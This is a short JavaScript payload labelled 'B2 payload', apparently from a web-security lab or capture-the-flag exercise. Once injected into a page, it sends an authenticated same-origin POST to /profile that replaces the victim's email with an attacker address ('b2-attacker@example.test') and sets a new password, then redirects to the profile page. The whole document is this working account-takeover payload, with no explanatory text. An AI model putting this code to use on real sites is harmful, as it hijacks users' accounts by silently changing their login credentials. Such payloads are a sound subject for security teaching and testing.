(() => {
  const replacementEmail = "b2-attacker@example.test";
  const replacementPassword = "B2-demo-password-2026!";

  const formBody = new URLSearchParams({
    email: replacementEmail,
    password: replacementPassword,
  });

  fetch("/profile", {
    method: "POST",
    credentials: "same-origin",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: formBody.toString(),
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error(`Profile update failed: ${response.status}`);
      }

      window.location.assign("/profile");
    })
    .catch((error) => {
      console.error("B2 payload failed", error);
    });
})();